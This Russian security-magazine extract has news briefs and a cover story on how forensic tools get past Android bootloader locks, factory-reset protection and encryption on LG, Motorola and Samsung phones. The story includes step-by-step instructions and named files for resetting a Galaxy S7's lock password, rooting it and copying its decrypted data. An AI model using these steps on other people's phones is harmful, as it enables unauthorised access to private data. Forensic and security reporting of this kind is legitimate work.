  еще в июле 2017 года. Кроме того, инженеры ком пании уверили, что смар‐
  тфонам на базе Windows уязвимости не страшны.
     Linux‐устройства, работа ющие с BlueZ, уяз вимы перед утечками данных,
  а   также  все  устройства,  использующие   3.3‐rc1  и  выше  (вышел
   в октябре 2011 года), уяз вимы перед RCE‐атаками через Bluetooth. Это каса‐
   ется и операци онной системы Tizen компании Samsung.
     Все  iPhone,  iPad  и  iPod,  работа ющие  под  управле нием  iOS
   9.3.5 и ниже, а также устройства AppleTV вер сии 7.2.2 и ниже были уязвимы,
  но получи ли обновление в составе iOS 10.
     Эксперты Armis настоятельно рекомендуют всем отключать Bluetooth, если
  он не используется, и как мож но скорее установить обновле ния, если они уже
  доступны.





  →«Я хочу снова видеть то комьюнити, что мы имели ког да‐то. Не знаю, возможно ли это,
   но такова моя основная цель. Все началось с модифициро ванного PHP‐форума, на котором
   мож но было размещать torrent‐файлы. В какой‐то момент мы начали использовать настоящий
   скрипт для индекса ции торрентов, написанный на PHP, и начали создавать первую версию того
   сайта, который существует сейчас»,
  — Deimos, осно ватель торрент‐трекера Demonoid, твердо вознамеривший ся вернуть
   ресурсу былую славу.





 УДАЧА COINDASH
  16 июля 2017 года израиль ский стартап CoinDash запустил про цеду ру ICO
    (Initial Coin Oﬀering, первичного размещения токенов), которая в итоге завер‐
  шилась не слиш ком хорошо для проекта. Через три минуты после раз‐
  мещения токенов неизвестные зло умышленни ки взломали сайт CoinDash
  и под менили адрес официального Ethereum‐кошель ка на свой собственный.
     Хо тя атаку обнаружи ли почти мгновен но, только за первые пять минут пос‐
  ле взло ма на кошелек хакеров перевели более 6 мил лионов дол ларов. В ито‐
   ге злоумышленники «заработали» более 43 тысяч Ethereum, что равнялось
  при мерно 8,3 миллиона долларов по курсу на тот момент.
     Тог да представители CoinDash пообещали, что выпустят токены для всех
  пос традав ших, которые отправили средс тва на кошелек преступников.
   Теперь, спустя два месяца пос ле инциден та, представители CoinDash неожи‐
  данно сообщили, что зло умышленни ки вер нули на один из кошельков ком‐
  пании 10 тысяч ETH, то есть почти 3 миллиона долларов по текущему курсу.
  Транзакцию действи тельно мож но уви деть здесь. При этом в кошельке зло‐
  умыш ленни ков до сих пор лежат оставшиеся 8 миллионов долларов.
     Что именно подтолкнуло хакеров вернуть средства, неиз вестно. Руково‐
  дители CoinDash пишут, что преступни ки не выходили с ними на связь и не
  делали никаких офи циальных заявлений, поэто му об их мотивах оста ется
  лишь догадываться.
     Представите ли CoinDash назвали слу чившееся «невероятным», но отме‐
   тили, что рассле дование июльского инциден та продолжается, в нем участву‐
  ют изра ильские правоохранитель ные орга ны.


  1,9 МИЛ ЛИАР ДА ЗАПИСЕЙ БЫЛИ УКРАДЕНЫ ИЛИ СЛУ‐
  ЧАЙНО УТЕКЛИ НА СТО РОНУ В 2017 ГОДУ
  →ИБ‐специалис ты из ком пании Gemalto под считали, что суммарный ущерб от различных уте‐
   чек данных в 2017 году уже превысил показа тели прошлого года: 1,9 мил лиарда записей
   на текущий момент против 1,37 миллиарда за весь 2016 год.

  В сред нем в открытый доступ ежедневно попада ют 10,4 мил лиона различных записей и ситу‐
   ация толь ко про дол жает ухуд шаться. К при меру, в первой половине 2017 года в мире было
   зафиксировано 918 утечек дан ных, что на 13% боль ше, чем за аналогич ный период прошлого
   года.

   Силь нее всего в отчете Gemalto удручает, что ме нее 1% из всех этих украденных или случайно
   обна родо ванных дан ных были зашиф рованы.





 ОПАСНЫЕ
 БУТЛОАДЕРЫ
  Спе циалисты из Калифор ний ского университета в Санта‐Бар баре предста‐
  вили на конференции Usenix интерес ный доклад, посвященный безопасности
   бутлоаде ров ведущих производителей. Исследователи обнаружили семь уяз‐
  вимос тей, нарушающих цепочку доверия (Chain  of  Trust, CoT), а с ней
  и безопасность пер воначального поряд ка заг рузки.
      Android‐бутлоадеры, по сути, представляют собой «серую область», изу‐
   чать которую довольно сложно в силу закрытости исходных кодов и отсутс‐
   твия метадан ных. Поэтому большую часть времени специалисты потратили
  на соз дание инструмента BootStomp, пред назна ченного спе циально для тес‐
  тирования и анализа бутлоадеров и облегча юще го реверс‐инжиниринг.
     Аналити ки объясняют, что задача BootStomp заключается в авто матичес‐
  ком обна руже нии уязвимостей, связан ных с использовани ем атакующими
  энергонезависи мой памяти, которой доверяет код бутлоаде ра. Таким обра‐
   зом, BootStomp помогает автоматизировать поиск багов и обна ружить проб‐
  лемные области, которые затем проверя ют люди. Используя данную методи‐
   ку, специалисты сумели обнаружить семь уязвимостей, лишь одна из которых
  была извес тна ранее (CVE‐2014‐9798). Осталь ные шесть багов оказались
  новыми, что уже признали сами производители. Суммарно команда спе‐
  циалис тов из Калифорний ско го универ ситета проверила пять бутлоадеров
  четырех разных про изводителей:
   • Huawei/HiSilicon чип сет [Huawei P8 ALE‐L23];
   • NVIDIA Tegra чипсет [Nexus 9];
   • MediaTek чип сет [Sony Xperia XA];
   • Qualcomm новый LK бутлоадер;
   • Qualcomm старый LK бут лоадер.



         «Некоторые из [найденных нами] уяз вимос тей могут поз волить ата-
        кующему выполнить произвольный код в виде час ти бутлоаде ра (что
        ком прометирует всю цепоч ку доверия) или осу щес твить пер манен-
        тную DoS-ата ку. Наш инс тру мент так же выявил два бутлоаде ра, уяз-
        вимос ти в которых могут быть использованы ата кующим с root-при-
         виле гиями на уров не ОС для раз блокиров ки устройства и ком про-
        мета ции CoT», — пишут иссле дова тели.

  Спе циалистам было известно, что ста рый бутлоадер Qualcomm LK уяз вим
  перед проблемой CVE‐2014‐9798, и BootStomp повторно обнаружил данный
   баг, тем самым поз волив команде убедиться в том, что инструмент работает
   как дол жно. В ито ге расследование выяви ло уяз вимость в продуктах NVIDIA
  и еще пять багов в бутлоадерах HiSilicon. Резуль таты тес тов приведены в таб‐
  лице ниже.





  САМЫЙ ПОПУЛЯР НЫЙ МЕС СЕНДЖЕР СРЕДИ КИБЕР ПРЕС‐
  ТУПНИ КОВ — ЭТО DISCORD
  →Ана литики ком пании IntSights изучили самые популярные средства коммуникации в даркне‐
    те. В отчет специалис тов вошли все упоминания о каких‐либо средствах связи, най денные
   на стра ницах различных ресурсов даркнета, за период с июня по июль 2017 года.

   Использование мессенджеров в киберкриминаль ной сре де в целом возросло в 30 раз
   по срав нению с прошлым годом.

   Самым популярным среди киберпрес тупников мессен джером неожиданно оказался Discord,
   разработ чики которо го вообще отказываются использовать шиф рование end‐to‐end.

   На втором и третьем местах, с боль шим отставанием, расположи лись Telegram и WhatsApp.





  →«Такая популярность Discord удивительна, если учесть, что это сравнительно небольшая
   платформа, которой пользуются толь ко 45 миллионов человек», — пишут аналити ки IntSights.
COVERSTORY





                                                                               Олег Афонин
                                                                                        Эксперт по мобильной
                                                                                      криминалистике компании
                                                                                          «Элкомсофт»
                                                                                                aoleg@voicecallcentral.com





                  ИЗУЧАЕМ БАГИ LG, SAMSUNG И MOTOROLA,
                       ПОЗВОЛЯЮЩИЕ СНЯТЬ ДАННЫЕ
                      С ЗАШИФРОВАННОГО СМАРТФОНА




Android — это система, которая при выполнении ряда усло‐
вий и грамот ном использовании мог ла бы стать дос таточно
безопасной. В реальном же мире все портят производители.
Сегодня мы рассмот рим защит ные механизмы  Android,
призванные обеспечивать доверен ную заг рузку и охранять
твои данные от злоумышленников, — а также изучим ошибки
и не сов сем ошибки произво дителей LG, Motorola и Sam‐
sung, сводящие пользу от этих механиз мов на нет.


В пре дыдущем номере Евгений Зоб нин опуб ликовал статью, продол жающую
бесконеч ную дис куссию о безопас ности мобильных операционных систем.
По утвер жде нию Евге ния, «чистый» Android задумывался как достаточно
безопасная система, а количество найден ных в самой системе уяз вимос тей
вполне срав нимо с числом уяз вимостей ближайшего конкурента — Apple iOS.
  Сегодня мы разберем ся, о каких именно механиз мах безопас ности идет
речь, и попробуем натянуть «сферический Android в вакууме» на глобус
реального  мира,  пред ставленный  устройствами  таких  производителей,
как Samsung, LG и Motorola (Lenovo).
  Помимо тех нических, мы рассмотрим и полити ческие аспекты защиты тво‐
ей информации в реальных устройствах. Если Apple не пос теснялась судить‐
ся с государством за пра во не разрабатывать версию системы, которая мог‐
ла бы использоваться спецслуж бами для доступа к твоим данным, то как с
этим обстоят дела у бли жай шего конкурента — компании Samsung? (Спой‐
лер: с точностью до наобо рот.)
  Но начнем мы все же с технологий.


ANDROID И ДОСТУП К ДАННЫМ
Как я уже описывал в одной из ста тей, у безопас ности мобильных устройств
множество аспектов. Здесь и безопасность хранения данных, и устойчивость
к взло му с помощью физичес ких атак, и защита от кражи, и разнообразные
песоч ницы для приложений, ограничи вающие их возможность незаметно
следить за тобой, собирать и переда вать информацию, и многое другое.
Сегод ня мы оста новимся толь ко на одном аспекте, а именно — устойчивости
устройств к физическим ата кам, с помощью которых злоумышленник, спец‐
службы или органы охраны правопоряд ка могут попытаться извлечь из него
твои данные.
  С каж дым поколением устройств и с каж дой новой версией мобильных ОС
смар тфо ны становят ся все более безопасными. И это не иллюзия: и Apple,
и Google прикладывают все уси лия, чтобы свес ти к минимуму возможности
неав торизованного доступа к информа ции. Разумеется, все их дей ствия
совершают ся в рамках огра ничений, заданных как самой платформой, так
и конкретными устройствами на ее основе.
  Давай рас смот рим некото рые из этих механизмов и то, как они спо собс‐
твуют защите от несанкциони рованного дос тупа.


БЛОКИРОВКА ЗАГРУЗЧИКА
Прежде чем вдаваться в детали реали зации шифрования, немного погово‐
рим о встро енных в Android механизмах, которые призваны защитить твои
данные от неразрушающих спо собов извлечения. Для нас пред став ляют
интерес три вещи: бло кировка загрузчика (а точнее, все механизмы, способ‐
ные предот вратить запуск непод писанного кода), шиф рование раздела дан‐
ных и пароль, который может быть уста новлен на смартфон.
  В Android загрузчик (bootloader) — это пер вый код, который загружается
со встроенного в телефон накопи теля. Именно заг рузчик содер жит механиз‐
мы, с помощью которых устройство может проверить цифровую подпись
и целос тность загрузочного раздела, и именно загрузчик несет ответствен‐
ность за загрузку телефо на в систему или один из вспомога тельных режимов
fastboot или recovery.
  Во вре мя заг рузки операционной сис темы загрузчик выпол няет инструк‐
ции, которые передают управление ядру, записан ному в раздел boot. Пос‐
кольку загрузчик — это первое, что запус кается на смар тфоне, именно он
при нимает решение о том, какой именно код будет выпол няться, а какой —
нет. Соот ветствен но, защита (бло кировка) заг рузчи ка — важный эле мент
обеспечения безопасности цепочки загрузки.
   Итак, загрузчик запускается прежде всех остальных компонентов опе‐
раци онной системы. Он проверяет целостность ядра, а так же — если заг‐
рузчик заб локирован — аутентичность его цифровой подписи. (Разблокиро‐
ванный загрузчик все равно проверяет целос тность и цифровую подпись
ядра; просто подписать ядро мож но будет не только производите лю, но и
сторонним разработ чикам.) Если следующий ком понент загрузки не проходит
про верку целостности или безопасности, загрузка прервется, а поль зовате‐
лю будет выведе но соответству ющее уведом ление (осо бенно жестко этот
момент кон тролиру ется в версиях Android начиная с 7.0).
   Если загрузчик заблокирован, пользователь не сможет вносить изме нения
в системные и загрузочные раз делы, а также не смо жет загрузить устройство
коман дой fastboot boot xxx.img с помощью неподписанного образа (нап‐
ример, в сто рон нее recovery — TWRP и подобные).
   Если же заг рузчик разблокирован, то тебе будет доступно боль шинство
команд из арсе нала fastboot. В час тности, ты сможешь загрузить устройство
с исполь зовани ем  сторон него образа, модифицировать ядро системы
или системный раздел. Именно поэто му разблокирование загрузчика — пер‐
вое, что про делывают со своими устройства ми раз работ чики и хакеры.
   Казалось бы, разблокировка заг рузчи ка — оче видный шаг для полицей‐
ского, который хочет покопать ся в твоем телефоне. Но так может показаться
только на пер вый взгляд. Во‐первых, далеко не все производители поз воля ют
раз бло киро вать заг рузчик, а те, которые позволяют, разрешают разбло‐
кировку не для каждой модели и не для каждой операторской версии. Некото‐
рые производители предоставляют воз можность официально разблокиро‐
вать заг рузчик только после зап роса специального кода с их сай та, а некото‐
рые (нап ример, на устрой ствах линеек Nexus и Pixel, Nextbit Robin) — одной
коман дой в fastboot.
  Тем не менее исполь зовать эту процедуру для извлечения информации
не удастся: при разблокировании заг рузчика уничтожаются криптографичес‐
кие клю чи, с помощью которых зашифрован раздел пользовательских дан‐
ных, и происхо дит сброс до заводских нас тро ек. Не хочешь сбрасывать?
Зашифрованный раздел данных ты сможешь скопировать, но расшифровать
его не удастся никаки ми средства ми.




К сло ву, штатной разблокиров ки заг рузчи ка для устрой ств Apple не пре дус‐
мотре но вовсе, а нем ногочисленные эксплоиты зор ко стерегутся разработ‐
чиками: их поиск может длить ся годами, а закрыть обна руженную уязвимость
для Apple — дело одной‐двух недель.



ЗАЩИТА ОТ СБРОСА К ЗАВОДСКИМ НАСТРОЙКАМ
Допустим, тебе каким‐то образом удалось обой ти блокировку загрузчика (что
само по себе малове роятно) или в твои руки попал телефон с уже раз бло‐
киро ванным заг рузчи ком. Теперь‐то мож но запус тить TWRP и скопировать
раз дел данных? Скорее да, чем нет, но не всегда и не на всех устройствах.
В Android пре дусмотрен дополнительный механизм защиты — как раз
для таких случаев.
  Незави симо от того, заблокиро ван или раз блокиро ван загрузчик устрой‐
ства, в боль шинс тве моделей Samsung и Motorola есть еще одно неочевид‐
ное пре пятс твие на пути доступа к информа ции.
  С выходом Android 5.1 разработчики Google добавили механизм, нап‐
равленный на пре дотвращение доступа  к данным и сброса устройства
к завод ским настройкам в случае его кражи. Основное предназначение
защиты от сбро са к заводским настрой кам (Factory Reset Protection, FRP) не в
том, чтобы защитить устройство от сбро са как такового, а в том, чтобы сде‐
лать его бес полез ным для злоумыш ленников, предот вратив возможность его
акти вации и использования после сбро са.
  При активированной защите FRP злоумышленник может удалить данные
и сбросить устройство, но (по крайней мере в теории — на самом деле спо‐
собов обойти эту защиту существу ет порядоч но) воспользоваться им не смо‐
жет: система начальной настрой ки потребует ввести учетные данные того
Google Account, который исполь зовался перед сбро сом устрой ства.
  FRP  активиру ется  автоматически  во  время  нас тройки  устройства
при выпол нении двух условий: 1) использует ся безопас ный экран блокиров‐
ки: устройство защищено PIN‐кодом, паролем, паттерном или дру гим спо‐
собом; 2) пользователь добавляет хотя бы одну учетную запись Google Ac‐
count. Соответственно, при вык лючении безопасного экрана блокировки
или при удалении учетной записи Google из настроек устройства защита FRP
так же авто матически отключается.
   Итак, защита от сброса к заводским настройкам — отлично задуманная
(но плохо реали зованная) система. Но при чем тут она? Дело в том, что ряд
про изводителей  (в частности, Samsung и Motorola) пошли чуть дальше,
реали зовав дополнительный защитный механизм именно через систему FRP.
   Что произойдет, если зло умышленник загрузит устрой ство в стороннее
recovery и попросту обну лит раз дел frp? Или же уста новит прошив ку без при‐
ложений Google, обойдя таким образом защиту от кражи? С разблокирован‐
ным заг рузчи ком это вполне возможно.
  Именно для защиты от подоб ных сценариев исполь зуется допол нительная
про верка. При акти виро ванной защите от сбро са к заводским нас тройкам
FRP устройство всегда будет вести себя так, буд то его заг рузчик заблокиро‐
ван, — даже если была про изве дена процедура раз блокировки. Загрузить
неподписанный код (сто роннее recovery или прошивку) не получит ся.
   Та ким образом, даже если заг рузчик смартфона раз блокирован (напом‐
ним, боль шинс тво поль зователей это го не делает), его все равно не удастся
загрузить в сто роннее recovery, если:
 • в устройстве до сброса была настроена учет ная запись Google Account;
 • был настроен безопасный экран бло кировки (пароль, паттерн и подоб‐
   ное).

Сов местно с защитой, предоставляемой бло кировкой загрузчика, FRP спо‐
собен вполне эффективно воспрепятствовать загрузке стороннего кода
и извлечению данных.


ИЗВЛЕКАЕМ ДАННЫЕ ИЗ УСТРОЙСТВ С ЗАБЛОКИРОВАННЫМ
ЗАГРУЗЧИКОМ
Итак, способ с офи циальной раз блокиров кой заг рузчика нам не подходит:
при разблокировании как криптографические клю чи, так и сами данные унич‐
тожаются. Даже в том маловероятном случае, если бы удалось раз блокиро‐
вать устройство без потери дан ных, механизм защиты от сбро са к заводским
нас тройкам может помешать запуску неподписанного загрузоч ного образа.
  В теории — в том самом «сферичес ком Android в ваку уме» — все хорошо:
система безопасна, враг не пройдет. А вот на практике… На практике бывает
раз ное.
   Возьмем, например, смартфоны LG. Производитель пре дусмотрел в них
чрез вычай но  удоб ный  сервисный  режим,  изна чаль но  предназначенный
для обновле ния про шивки. Однако, в отличие от сервисного режима DFU
в iPhone, реали зация протокола LAF допускает двус тороннюю коммуникацию.
Соот ветственно, ты можешь легко и изящ но воткнуть практичес ки любой
телефон производства LG незави симо от чип сета, версии Android и тому
подоб ной  мишуры,  запус тить  при ложе ние  и  нажать  кнопку.  Спустя
десять‐пятнадцать минут у тебя на компь ютере будет полная копия всех раз‐
делов устройства.
  Сам процесс пре дельно прост. Для начала потребуется перевести смар‐
тфон LG в режим LAF, для чего нуж но вык лючить телефон, зажать кнопку
«Гром кость+» и под клю чить устройство к компь ютеру. Телефон при этом
будет выглядеть как‐то так.





Дальше запускаем любую программу с поддержкой данного режима (нап‐
ример, Oxygen Forensic  Suite), выбираем из списка доступных методов
«Смартфо ны LG» и жмем кнопку. Спустя нес коль ко окошек с инс трукциями,
которые мы пропустим, на экране компьютера появится что‐то в таком роде.





Те перь дос таточно прос то подождать, и у тебя образуется пол ная копия дан‐
ных пользовате ля. Обрати вни мание: нам даже не пришлось загружать сис‐
тему! Извле чение через сер висный режим не оставляет следов и вообще —
«чис тая работа».
  А что насчет других устрой ств, тех, что не LG? Для многих из них есть
подоб ные сервисные режимы. Для смар тфонов с чипсетами  MediaTek
это  небезызвестный SP  Flash  Tool,  для телефо нов  на Qualcomm —
режим 9008, который также откры вает низкоуровневый доступ к данным
(впрочем,  его  исполь зование  требует  дополнительных  телодвижений
и некоторых файлов, не всегда доступных широкой публике).
   У тебя не воз никло мысли, что все это как‐то… черес чур прос то? Ты
совершенно прав: все эти методы прек расно работали  (и про должают
работать!) на устрой ствах, выпущенных с Android до версии 5.1.1 включитель‐
но, даже если эти устрой ства потом обно вились до 6‐й или 7‐й версии сис‐
темы. А вот для све жих устройств, которые были выпущены с Android
6.0 на борту, этот подход уже не сра ботает. Точнее, сработает лишь час‐
тично: данные мы скопиру ем, но столкнемся с тем, что они окажутся зашиф‐
рованы.


ШИФРОВАНИЕ
Шиф рование сложным, неизвлекаемым ключом — основной и глав ный метод
защиты данных. В конце концов, телефон, даже нерабочий, всег да можно
разоб рать, чип памяти — извлечь и счи тать с помощью недорогого адаптера.
В таких сценари ях толь ко и исключительно шиф рование способно защитить
информацию.
  Шифрование было доступно пользователям Android на самых ранних эта‐
пах становления системы, но во что‐то более‐менее безопас ное этот
механизм прев ратился лишь совсем недав но. Вплоть до версии 6.0 шиф‐
рование раз дела данных оставлялось на откуп пользовате лю; чтобы его вклю‐
чить, тебе приш лось бы зайти в настрой ки и вручную активировать соответс‐
твующую опцию. Как думаешь, какой процент пользовате лей это делал?
Добав лю, что даже на таких смартфонах, как Nexus 6, который дол жен был
показать, что защита дан ных — это совсем не страш но, шифрование серь‐
езнейшим образом тормозило работу устройства. В резуль тате шиф рование
включали лишь отдельные параноики и жер твы корпоратив ных политик
безопасности.
  Си туация стала изменяться с выходом шес той версии Android и массовым
рас пространени ем устрой ств на 64‐битных чип сетах ARM, в наборе команд
которых (ARMv8) присутс твуют расширения для аппа ратного ускорения крип‐
тографических опе раций. Теперь про изводите ли, выпус кающие устрой ства
с Android 6.0 (и более новых версий) на борту, должны акти вировать шиф‐
рование по умолчанию — иначе смартфон не пройдет сертификацию и не
сможет получить доступ к Play Store и другим сервисам Google.
   Да, здесь есть своя ложка дегтя: старые устройства, которые обновля ются
до Android 6, а также весь несертифицированный Китай продолжают обхо‐
диться без шифрования. Одна ко в целом о твоей безопасности позабо‐
тились: покупая новое устрой ство в магазине, ты получаешь шифрование,
работа ющее, что называ ется, из короб ки.
   Ну что — iOS грустно курит в сто ронке? Ну… поч ти. Дело в том, что
начиная с версии 7.0 Android поддержи вает два механиз ма шиф рования
накопителя: FDE (Full‐disk encryption, полнодис ковое шифрование) и FBE
(File‐based encryption, пофай ловое шифрование). Второй метод более совер‐
шенный, но мно гие производители по‐преж нему продол жают использовать
схе му FDE либо по при вычке, либо просто из‐за отсутс твия возможнос ти
использовать FBE. А это при водит к ряду проб лем.


ПОЛНОДИСКОВОЕ ШИФРОВАНИЕ
Ес ли помнишь, в iOS исполь зуется продвинутая многос лой ная система шиф‐
рования. На блочном уровне (а есть еще и отдельное дополнительное шиф‐
рование для некоторых категорий дан ных!) сис тема использует уни кальные
крип тографические клю чи, чтобы защитить каждый блок данных по отдель‐
ности. При удалении фай ла и осво бождении блоков данных на диске соот‐
ветствующие им ключи уда ляются, что делает совершенно невозможным вос‐
ста новление информации из таких блоков.
  Полнодисковое шифрование в Android устроено намного проще. Крип‐
тографический ключ один на весь раз дел; на уровне сис темы никакой допол‐
нительной защиты для отдельных типов данных (см. понятие «связка ключей»
в iOS) не предус мотре но.
  Но и это еще не все! Так, если пользователь iOS установил на свой iPhone
пароль или PIN‐код (а его приходится установить, что бы активировать дат чик
отпе чатков пальцев Touch ID), то криптографичес кий ключ будет генери‐
роваться на лету в про цессе заг рузки устройства на основе как данных из Se‐
cure Enclave, так и собственно пароля, вве денного пользователем.
  При полнодисковом шиф ровании действу ет сов сем другая схе ма. Если
поль зователь не вклю чит режим «Запрашивать пароль при загрузке устрой‐
ства», то раздел данных будет зашифрован клю чом, который создается
на осно ве фик сированного пароля default_password и криптогра фичес ких
данных, которые хранят ся в защищенной среде Trusted Execution Environment
(TEE).
  Еще раз, помедленнее. Ты можешь вводить сколь угод но длинный пароль,
но ключ для шифрования всех твоих данных будет основан на фразе default_‐
password и данных из TEE.
  Использование фразы default_password вместо PIN‐кода или пароля поль‐
зователя поз воляет Android полностью заг рузить сис тему и запустить при‐
ложения еще до того, как ты раз блокируешь смартфон. Сейчас не будем
о том, зачем это сделано именно так; теории, что телефоны на Android склон‐
ны  к самоп роизволь ным перезагрузкам, а iPhone —  нет, мы отме тем
как несос тоятель ные. Просто констатируем, что, с одной сто роны, такая схе‐
ма удоб на; с другой — зна чительно менее безопасна, если сравнивать с под‐
ходом Apple или обязатель ным использованием пароля для загрузки устрой‐
ства. В конце концов, никто не меша ет тебе пожертвовать толикой удобс тва
и включить тот самый режим «Запрашивать пароль при загрузке устрой ства».
Тем не менее даже такой защиты «паролем по умол чанию» уже достаточно
для того, что бы низкоуровневое извлечение данных (например, с пря мым
доступом к мик росхе ме памяти) не сработа ло: раз дел дан ных останется
зашифрованным, а необходимые для генерации клю ча шиф рования данные
невозможно будет извлечь из модуля TEE.
   Если же ты включишь режим безопасной  загрузки (Secure  start‐up)
и опцию «Зап рашивать пароль при заг рузке устройства», то ключ шиф‐
рования будет генерировать ся каждый раз при заг рузке устрой ства на осно‐
ве как данных из TEE, так и того пароля, который введет пользователь.
Телефон не сможет продолжить загрузку, а дан ные не будут рас шифрованы
до тех пор, пока поль зователь не ука жет пра виль ный пароль.





                  Вклю чаем режим Secure start‐up

В целом такая схема работа ет против прямоли нейных атак стандартными
методами. Но…


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ





                    ИЗУЧАЕМ БАГИ LG, SAMSUNG И MOTOROLA,
                        ПОЗВОЛЯЮЩИЕ СНЯТЬ ДАННЫЕ
                       С ЗАШИФРОВАННОГО СМАРТФОНА





ЧТО-ТО ПОШЛО НЕ ТАК
Пос ле того как Google ввела практику обя затель ного неотключаемого шиф‐
рования раздела данных, многие пользователи стали думать (если они вооб‐
ще об этом задумывались), что их смартфо ны с Android по безопас ности сов‐
сем как iPhone. Неот ключаемое аппа ратное шифрование, корректно исполь‐
зуемые датчики отпе чат ков пальцев, заблокиро ванные загрузчики, защита
от кражи и сброса к заводским настрой кам — галоч ки можно поставить нап‐
ротив каж дого пункта. Казалось бы, что может пойти не так?
   «Не так» начинается в тот момент, ког да мы спус каем ся с небес на зем лю
и вместо абстрак тного «чистого Android» начина ем рассматривать реально
существующие устройства. Спе циально для тех, кто счи тает, что «надо брать
Nexus/Pixel и прочие гуглофоны», ремарка: описанный ниже метод был раз‐
работан  на  осно ве  уязвимости,  обнаружен ной  именно  в  смартфо не
от Google — Nexus 6 и исправленной лишь в июле 2017 года.


ЧТО-ТО ПОШЛО НЕ ТАК, ЧАСТЬ ПЕРВАЯ: MOTOROLA
Заг рузчи ки, FRP, шиф рование… Ока залось, что все эти вещи можно обойти
буквально в пару кликов, если использовать метод, разработанный Oxygen
и встроенный в софт для полицейских «Мобиль ный кри миналист». Как обна‐
ружилось, в подав ляющем боль шинс тве устрой ств, выпущенных под маркой
Motorola как во времена бытности ее независимой компанией, так и под кры‐
лом спер ва Google, а потом и Lenovo, присутс твует критическая уяз вимость
на уровне загрузчи ка. Уязвимос ти подверже ны практичес ки все устрой ства
Motorola, выпущенные в период с 2013 по 2017 год. Метод действует незави‐
симо от версии Android, блокировки заг рузчика и статуса FRP. Уязвимость
была исправ лена лишь в тех устройствах, которые работа ют под управле нием
пос ледних версий Android с июль ским патчем безопасности (к слову, его
получи ли лишь самые свежие модели Motorola и некоторые флагманы).
  Работает это так. Для каж дого конкрет ного устрой ства с помощью при‐
ложения (то есть в автомати чес ком режиме) соз дается уникальный загрузчик,
который загружается в оперативную память устрой ства и получает управле‐
ние. Телефон при этом выг лядит так.





На компьютере будет сначала так.





А потом так.





Дальнейшее — вопрос тех ники: заг ружен ный в память устрой ства код выпол‐
няет все команды, с помощью которых из телефо на извлекаются как собс‐
твен но данные пользователя, так и, с некоторыми ого ворками, ключи шиф‐
рования. Защищен ные данные расшифро вываются на лету. Метод опробован
на большом количес тве раз нообразных моделей (испы тано лично); он
работа ет даже для устрой ств с заб локированным заг рузчиком и активирован‐
ной защитой FRP.
  О каких ого вор ках идет речь? Дело в том, что клю чи шифрования воз‐
можно извлечь не всегда. Так, для устрой ств, оборудо ванных аппаратным
модулем TEE, ключ шиф рования мож но извлечь, только если пользователь
не уста новил безопасный экран блокиров ки (пароль или пат терн) или пароль
раз бло кировки известен. А если нет? Мож но попробовать подобрать; прин‐
ципиальных ограничений здесь нет, но перебор возможен только на самом
смар тфо не, а пос ле ряда неудачных попыток TEE начнет уве личивать задер‐
жку между попытками на аппаратном уровне, так что перебор будет очень
и очень медленным.
  Сле довательно, не все так страш но? Возможно, особенно если на твою
«Моторолу» прилетел июль ский патч безопасности или у тебя сов ременное
устройство с TEE и установлен длинный и слож ный пароль. Но подожди, у нас
же остался лидер смартфоностроения — Samsung! Давай посмотрим,
как обсто ят дела с его прош логод ним флаг маном — Samsung Galaxy S7.


ЧТО-ТО ПОШЛО НЕ ТАК, ЧАСТЬ ВТОРАЯ: SAMSUNG GALAXY S7
В случае с Motorola нам может помешать наличие пароля устройства. Да, его
можно переби рать, но это долго, мед ленно и скучно. Но погоди, зачем
пароль, если шифрование (по крайней мере в режиме «по умолчанию»)
от него никак не зависит? Здесь в дело вступает такая шту ка, как TEE,
который согласен исполнять (в нашем случае — с целью рас шифровки раз‐
дела данных) исключительно доверенные микропрограммы, подписанные
про изводителем. В слу чае со смартфонами Motorola софт от «Оксиджен»
эксплуати рует уязвимость на уровне заг рузчи ка, позволяя обойти стандар‐
тные механизмы защиты от выполнения произвольного кода во время заг‐
рузки смар тфона, то есть на уровне системы. А вот на модуль TEE эта уяз‐
вимость никак не распространяется, и сопроцес сор не выдаст криптогра‐
фичес кий ключ, если код не под писан непос редствен но производителем.
  А что, если сам про изводитель соз даст и подпишет своей криптогра‐
фичес кой под писью код, который полезет в TEE и вытащит оттуда ключи?
«Фантастика», — ска жешь ты. «Паранойя», — хмыкнешь ты. «Оче редная
теория загово ра?» — спро сишь ты. И будешь не прав. Встре чайте: ува‐
жаемая компания Samsung, номер один по про дажам устройств на Android,
не прос то написала (и под писала) такой код, но и позволила ему утечь
в интернет. Почему‐то про это не трубили во всех газетах (а ведь каж дый
джейлбрейк каждой мелкой подверсии iOS широко осве щается соответс тву‐
ющи ми СМИ), но факт оста ется фактом: инже нерный загрузчик был создан
Samsung, подписан Samsung, украден у Samsung и выложен в Сеть на все‐
общее обозрение.
   Что это означает на практике? Всего лишь то, что теперь можно загрузить
смар тфон в инженер ный заг рузчик и сбросить пароль бло кировки устрой‐
ства. Вот прос то так — взять и сбросить. И все? Нет, не все: инже нерный заг‐
рузчик поз воля ет получить права супер пользователя, установив root в сис‐
тему. Дальнейшие шаги тривиальны: смартфон загружается в систему, раз‐
дел данных успешно рас шифро вывается, и при помощи root‐доступа сни‐
мается полный расшифро ванный образ фай ловой системы.
  Посмотрим на про цесс вни мательнее. Что тебе понадобит ся? Джентль‐
менский набор:
 1. Мо дифициро ванная версия инс трумента Samsung Odin Downloader Tool:
   Odin3 v3.12 (PrinceComsy).zip.
 2. Инженерный загрузчик G891A_7.0_ENG_ROOT.tar.
 3. Скрипт для установки root: Nougat_S7aRoot_2.82_V2.zip.

Процесс пошел:
 1. Загружаем устройство в recovery: заж ми кнопки Vol+ и Home, пос ле чего
   зажми Power. Удерживай все три кноп ки, пока экран не мигнет и на нем
   не появится лого. В этот момент отпусти кнопки.
 2. Запускаем Odin modiﬁed v.3.12 by PrinceComsy.
 3. Прошиваем инже нерный загрузчик из архива G891A_7.0_ENG_ROOT.tar
   (не распаковывая), выбрав только опцию AP и ука зав в ней путь к архиву.
 4. На этом этапе пароль устрой ства будет сброшен и ты сможешь загрузить
   систему и акти виро вать режим раз работчика в настрой ках (это необ‐
   ходимо, что бы зарабо тал ADB, если он не работа ет).
 5. Рас пакуй Nougat_S7aRoot_2.82_V2.zip и запусти root.bat.

На дан ном эта пе ты успешно сбросил пароль устройства и получил root‐дос‐
туп и доступ к ADB. У тебя есть полный доступ к файловой сис теме (обрати
вни мание, уже расшифро ванной фай ловой системе!). Скопировать данные
на компь ютер теперь мож но с помощью любой подходящей программы —
от «Мобильного криминалиста» до простого ADB.
  Пароли? Шиф рование? Нет, не слы шали. Безопасность? Samsung любит
